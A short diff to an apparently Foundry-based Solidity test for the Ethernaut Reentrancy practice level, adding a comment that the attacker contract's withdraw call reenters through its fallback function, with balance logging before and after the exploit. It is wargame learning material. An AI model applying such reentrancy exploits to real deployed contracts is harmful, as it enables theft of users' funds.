@@ -51,6 +51,7 @@ contract Attack is BaseSetUp {
         emit log_named_uint("attacker balance in contract", ethernautReentrancy.balanceOf(address(attackerContract)));
         emit log_named_uint("contract balance", address(ethernautReentrancy).balance);
         
+        // call withdraw and reenter with the attacker's fallback function
         attackerContract.withdraw(1 ether);
 
         emit log_named_uint("contract balance after exploit", address(ethernautReentrancy).balance);
